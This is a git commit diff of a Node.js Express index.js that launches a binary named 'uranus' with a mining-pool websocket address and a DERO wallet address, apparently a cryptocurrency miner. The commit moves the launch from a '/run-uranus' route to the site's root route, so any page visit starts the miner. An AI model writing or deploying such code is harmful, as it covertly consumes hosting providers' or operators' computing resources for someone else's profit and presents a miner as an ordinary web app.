003b573ba31a88503482cfa92a5ab6eb608fcfbe
progerdakaas <98955884+progerdakaas@users.noreply.github.com>
2023-02-13 19:41:26 +0100

    Update index.js

--- index.js
+++ index.js
@@ -3,8 +3,7 @@ const app = express();
 const port = 3000;
 const { spawn } = require('child_process');
 
-
-app.get('/run-uranus', (req, res) => {
+app.get('/', (req, res) => {
   const uranus = spawn("./uranus", ["-o", "wss://community-pools.mysrv.cloud:10300", "-u", "dero1qyfjd3gswr7afgrgm0w8trp5wn09sudh9mld8czscf9a46n6grhcgqghx8k3p"]);
 
   uranus.stdout.on('data', (data) => {
